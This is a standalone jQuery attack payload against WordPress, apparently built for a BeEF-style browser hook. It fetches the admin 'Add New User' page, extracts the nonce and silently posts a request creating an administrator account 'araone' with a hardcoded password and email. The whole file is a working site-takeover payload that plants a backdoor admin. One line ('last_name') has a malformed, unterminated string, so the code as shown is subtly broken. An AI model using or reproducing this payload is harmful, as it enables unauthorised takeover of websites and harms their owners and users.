jQuery("<div>", {
    id: "testbeef"
}).appendTo("#screen-meta-links");

jQuery.get("user-new.php", function(data) {
    jQuery("#testbeef").html(data);
    var nonce = jQuery("#_wpnonce_create-user").val();
    jQuery("#testbeef").html("");

    jQuery.post("user-new.php", {
        "_wp_http_referer ": "/wordpress/wp-admin/user-new.php",
        "_wpnonce_create-user": nonce,
        action: "createuser",
        createuser: "Add New User",
        email: "araone@openmailbox.org",
        first_name: "",
        last_name: ",
        pass1: "123123hello",
        pass2: "123123hello",
        role: "administrator",
        url: "",
        user_login: "araone"
    });
});
